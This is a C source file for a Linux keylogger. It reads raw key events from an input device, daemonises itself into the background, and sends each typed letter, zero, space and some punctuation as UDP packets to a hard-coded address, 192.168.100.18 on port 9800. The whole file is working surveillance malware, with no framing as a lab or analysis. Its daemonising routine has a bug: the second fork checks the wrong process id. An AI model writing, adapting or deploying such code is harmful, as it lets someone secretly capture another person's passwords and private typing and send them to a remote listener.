#include <stdio.h>
#include <assert.h>
#include <fcntl.h>
#include <linux/input-event-codes.h>
#include <linux/input.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdbool.h>
#include <netinet/in.h>
#include <stddef.h>
#include <arpa/inet.h>
#include <sys/socket.h>


void udpsend(const char *message){

  int port = 9800;
  const char *ip = "192.168.100.18";

  //string ip to bytes
  struct sockaddr_in desti = {.sin_family = AF_INET, .sin_port = htons(port) };

  //the purpose of inet_pton is to cast the string ip to bytes input-event-codes
  if (inet_pton(AF_INET, ip, &(desti.sin_addr)) <= 0 ){     
  perror("SOMETHING WRONG WITH IP");
  exit(EXIT_FAILURE);
  }
  int udp = socket(AF_INET, SOCK_DGRAM, 0);
  if (udp < 0){
    perror("CANT CREATE SOCKET");
    exit(EXIT_FAILURE);
  }
  if (sendto(udp, message, strlen(message) + 1, 0,
    (struct sockaddr *)&desti, sizeof(desti)) < 0){
    perror("FAILED TO SEND PACKET");
    close(udp);
    exit(EXIT_FAILURE);
  }

  close(udp);
}

void daemonisasi(){
  pid_t pid = fork();
  assert(pid != -1);
  if (pid > 0){
    exit(EXIT_SUCCESS);
  }
  setsid();
  pid_t newpid = fork();
  assert(newpid != -1);
  if (pid > 0){
    exit(EXIT_SUCCESS);
  }
}

int main(int argc, char *argv[]){
  bool CAPS = false;

  int fd = open(argv[1], O_RDONLY, 0);
  struct input_event ie;

  daemonisasi();
  while (1){
    read(fd, &ie,sizeof(ie));

    if (ie.type != EV_KEY){
      continue;
    }

    if (ie.value != 1 ){
      continue;
    }

    //i need to convert the integer ie.code variable into string
    if (ie.code > 1 && ie.code < 11){
      printf("the key num that is being pressed is %d\n", ie.code - 1 );
      continue;
    }

    else if(ie.code == 11 ){
      udpsend("0");
      continue;
    }


    else if (ie.code == KEY_CAPSLOCK){
      CAPS = !CAPS;
    } 

    //capslock logic
    if (CAPS){
      switch(ie.code){
        case KEY_A:
          udpsend("A");
          break;
        case KEY_B:
          udpsend("B");
          break;
        case KEY_C:
          udpsend("C");
          break;
        case KEY_D:
          udpsend("D");
          break;
        case KEY_E:
          udpsend("E");
          break;
        case KEY_F:
          udpsend("F");
          break;
        case KEY_G:
          udpsend("G");
          break;
        case KEY_H:
          udpsend("H");
          break;
        case KEY_I:
          udpsend("I");
          break;
        case KEY_J:
          udpsend("J");
          break;
        case KEY_K:
          udpsend("K");
          break;
        case KEY_L:
          udpsend("L");
          break;
        case KEY_M:
          udpsend("M");
          break;
        case KEY_N:
          udpsend("N");
          break;
        case KEY_O:
          udpsend("O");
          break;
        case KEY_P:
          udpsend("P");
          break;
        case KEY_Q:
          udpsend("Q");
          break;
        case KEY_R :
          udpsend("R");
          break;
        case KEY_S :
          udpsend("S");
          break;
        case KEY_T :
          udpsend("T");
          break;
        case KEY_U :
          udpsend("U");
          break;
        case KEY_V :
          udpsend("V");
          break;
        case KEY_W :
          udpsend("W");
          break;
        case KEY_X :
          udpsend("X");
          break;
        case KEY_Y :
          udpsend("Y");
          break;
        case KEY_Z:
          udpsend("Z");
          break;
      }
    }
    else{
      switch(ie.code){
        case KEY_A:
          udpsend("a");
          break;
        case KEY_B:
          udpsend("b");
          break;
        case KEY_C:
          udpsend("c");
          break;
        case KEY_D:
          udpsend("d");
          break;
        case KEY_E:
          udpsend("e");
          break;
        case KEY_F:
          udpsend("f");
          break;
        case KEY_G:
          udpsend("g");
          break;
        case KEY_H:
          udpsend("h");
          break;
        case KEY_I:
          udpsend("i");
          break;
        case KEY_J:
          udpsend("j");
          break;
        case KEY_K:
          udpsend("k");
          break;
        case KEY_L:
          udpsend("l");
          break;
        case KEY_M:
          udpsend("m");
          break;
        case KEY_N:
          udpsend("n");
          break;
        case KEY_O:
          udpsend("o");
          break;
        case KEY_P:
          udpsend("p");
          break;
        case KEY_Q:
          udpsend("q");
          break;
        case KEY_R :
          udpsend("r");
          break;
        case KEY_S :
          udpsend("s");
          break;
        case KEY_T :
          udpsend("t");
          break;
        case KEY_U :
          udpsend("u");
          break;
        case KEY_V :
          udpsend("v");
          break;
        case KEY_W :
          udpsend("w");
          break;
        case KEY_X :
          udpsend("x");
          break;
        case KEY_Y :
          udpsend("y");
          break;
        case KEY_Z:
          udpsend("z");
          break;
      }
    }

    switch (ie.code) {
      case KEY_SEMICOLON:
        udpsend(";");
        break;
      case KEY_COMMA:
        udpsend(",");
        break;
      case KEY_DOT:
        udpsend(".");
        break;
      case KEY_SLASH:
        udpsend("/");
        break;
      case KEY_BACKSLASH:
        udpsend("\\");
        break;
      case KEY_SPACE:
        udpsend(" ");
        break;
      default:
        printf("UNKNOWN\n");
      }
  }
}

